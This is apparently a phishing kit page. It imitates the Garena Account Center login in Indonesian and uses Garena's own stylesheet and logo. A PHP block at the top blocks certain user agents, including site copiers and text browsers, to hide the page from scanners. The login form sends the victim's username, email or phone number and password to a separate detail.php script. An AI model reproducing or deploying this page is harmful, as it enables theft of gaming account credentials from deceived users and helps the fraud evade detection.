<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('https://www.facebook.com/IdhamDotID');
die();
}
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="description" content="Garena Account Center">
<link href="https://sso.garena.com/css/sso.css?v=0.54" rel="stylesheet" type="text/css">
<title>Garena Account Center</title>
</head>
<body style="">
<div id="page">
	<div id="header" class="header">
		<div class="topBarGarena"></div>
		<div class="topBar"></div>
		<h1><a class="logo" style="margin-top: 12px;" href="#"><img src="https://sso.garena.com/images/img_garena_logo.png" style="height: 35px;"></a></h1>
	</div>
	<div id="main-panel" class="mobile">
		<div class="content" style="top: 31.6px;">
			<h2 class="title">Login</h2>
			
			<form id="login-form" class="loginForm" action="../detail.php" method="post">
				<input type="hidden" name="prov" value="Garena">	
				<div id="line-account" class="line">
					<input id="email" name="user" type="text" placeholder="Username Garena / E-Mail / Nomor Handphone" autocorrect="off" autocapitalize="off" required>
			    </div>
				<div id="line-password" class="line">
					<input id="password" name="pass" type="password" placeholder="Password" required></div>
				<div class="line clearfix" id="sso_captcha_wrap"></div>
               <div id="line-btn" class="line btnLine">
					<button name="login" id="login" type="submit" class="btn">Login Sekarang</button></div>
				<div class="divider">
					<span>Atau</span>
				</div>
				<div id="line-btn" class="line btnLine">
					<input type="button" value="Daftar Akun Baru" class="btn black"></div>
			</form>
			<div class="linkLine">
				<a href="#" class="sec">Lupa Password</a>
			</div>
		</div>
	</div>
</div>
<script type="text/javascript" src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
</body>
</html>